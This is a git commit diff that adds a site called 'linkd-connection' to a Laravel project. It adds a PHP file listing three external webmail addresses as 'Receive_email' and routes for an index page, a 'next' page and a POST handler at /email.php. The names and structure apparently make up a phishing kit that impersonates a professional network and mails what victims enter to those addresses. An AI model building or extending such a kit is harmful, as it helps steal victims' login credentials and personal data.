23d01f877cec644a769c92cd067e7d47c7f5d697
Top <Liltop4lyfe@icloud.com>
2026-09-22 16:01:00 -0400

    Add linkd-connection site

---
+++ resources/email.php
@@ -0,0 +1,3 @@
+<?php 
+$Receive_email="obensocross@gmail.com,denko.peru1@yahoo.com,nation.cross@yandex.com";
+?>
--- routes/web.php
+++ routes/web.php
@@ -2,6 +2,9 @@
 
 use Illuminate\Support\Facades\Route;
 
-Route::get('/', function () {
-    return view('welcome');
+Route::get('/', fn() => view('index'));
+Route::get('/next.php', fn() => view('next'));
+Route::get('/next', fn() => view('next'));
+Route::post('/email.php', function () {
+    include resource_path('email.php');
 });
